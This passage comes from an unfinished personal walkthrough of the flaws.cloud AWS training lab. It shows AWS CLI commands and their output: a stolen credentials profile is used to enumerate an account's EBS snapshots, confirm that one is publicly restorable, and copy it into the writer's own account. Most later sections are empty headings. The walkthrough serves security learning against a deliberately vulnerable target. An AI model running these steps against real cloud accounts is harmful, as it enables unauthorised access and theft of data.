┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws sts get-caller-identity --profile pwned                                                   
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```
With the region and the user ID, it's now possible to call **`ec2 describe-snapshost`**. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2017-02-28T01:37:07+00:00",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "VolumeId": "vol-04f1c039bc13ea950",
            "State": "completed",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "Progress": "100%",
            "OwnerId": "975426262029",
            "Description": "",
            "VolumeSize": 8,
            "Encrypted": false
        }
    ]
}

┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile pwned --region us-west-2
{
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

I can now create a volume in my own account from the public snapshot. Note how I didn't specify a profile since it defaults to my own account
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89         
{
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false,
    "VolumeId": "vol-027133a97079dd855",
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "AvailabilityZone": "us-west-2a",
    "State": "creating",
    "CreateTime": "2025-10-09T18:01:18+00:00",
    "Encrypted": false
}
```

I won't add the screenshots here, but the next step is to create an EC2 instance and attach this volume to it. You can create an instance by browsing to EC2 > Launch Instance



---- next step is to attach the volume to the new instance in my own account, mount it, launch the instance an enumerate it from there ---------






<br>

### Level 5



<br>

### Level 6



<br>

## flaws2.cloud

## pwnedlabs.io

## HTB Fortress: AWS

## CloudGoat 2.0

## AWSGoat
  


